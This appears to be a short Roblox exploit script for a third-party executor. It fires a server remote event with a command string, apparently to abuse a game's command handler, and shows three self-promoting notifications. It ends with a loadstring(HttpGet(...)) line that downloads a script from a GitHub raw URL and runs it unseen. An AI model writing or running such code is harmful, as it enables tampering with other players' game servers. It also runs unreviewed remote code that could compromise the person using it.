game.ReplicatedStorage["01_server"]:FireServer("cmd", "-gh 4524991457")
task.wait(3)
game.StarterGui:SetCore("SendNotification", {
    Title = "Sky Notifys You!";
    Text = "This Script Has MP3 On It";
    Duration = "8";
})
game.StarterGui:SetCore("SendNotification", {
    Title = "Sky Notifys You!";
    Text = "also press 1 to walk (equip only)";
    Duration = "8";
})
game.StarterGui:SetCore("SendNotification", {
    Title = "Sky Notifys You!";
    Text = "1, 2, 3, 4, 5, These are modes, understand?";
    Duration = "8";
})
loadstring(game:HttpGet("https://raw.githubusercontent.com/banishercool/banishercool/refs/heads/main/oversized.txt"))()